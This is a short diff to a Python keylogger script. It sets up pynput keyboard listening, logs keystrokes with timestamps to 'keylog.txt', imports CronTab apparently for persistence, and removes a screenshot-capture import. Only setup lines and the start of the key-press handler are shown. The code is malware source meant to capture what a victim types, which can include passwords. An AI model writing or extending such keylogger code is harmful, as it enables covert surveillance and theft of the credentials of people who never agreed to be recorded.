@@ -3,12 +3,12 @@
 from pynput.keyboard import Key, Listener
 import logging
 from crontab import CronTab
-from PIL import ImageGrab
 
 # Initialize Log File
 logging.basicConfig(filename=("keylog.txt"), level=logging.INFO, format="%(asctime)s - %(message)s")
 # Initialize Variable
 word=''
+
 # Whenever a key is pressed:
 def on_press(key):
     global word
